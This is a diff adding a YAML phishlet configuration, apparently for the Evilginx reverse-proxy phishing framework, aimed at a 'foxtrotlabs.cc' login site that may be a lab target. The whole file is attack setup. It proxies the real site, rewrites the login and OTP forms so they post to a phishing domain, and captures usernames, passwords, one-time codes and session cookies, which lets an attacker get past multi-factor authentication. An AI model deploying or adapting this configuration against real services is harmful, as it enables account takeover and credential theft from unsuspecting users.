@@ -1,0 +1,52 @@
+name: "foxtrotlabs"
+author: "foxtrot_charlie"
+min_ver: "3.0.0"
+
+proxy_hosts:
+  - phish_sub: "cyberstarter"
+    orig_sub: "target"
+    domain: "foxtrotlabs.cc"
+    session: true
+    is_landing: true
+    auto_filter: true
+
+sub_filters:
+  - triggers_on: "body"
+    orig_sub: "target"
+    domain: "notfoxtrotlabs.cc"
+    search: '<form method="post" action="/login">'
+    replace: '<form method="post" action="https://cyberstarter.notfoxtrotlabs.cc/login">'
+    mimes:
+      - "text/html"
+  - triggers_on: "body"
+    orig_sub: "target"
+    domain: "notfoxtrotlabs.cc"
+    search: '<form method="post" action="/otp">'
+    replace: '<form method="post" action="https://cyberstarter.notfoxtrotlabs.cc/otp">'
+    mimes:
+      - "text/html"
+
+auth_tokens:
+  - domain: ".foxtrotlabs.cc"
+    keys: ['cookie']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: "username"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  otp:
+    key: "otp"
+    search: "(.*)"
+    type: "post"
+
+login:
+  domain: "target.foxtrotlabs.cc"
+  path: "/login"
+
+log_level: 'debug'
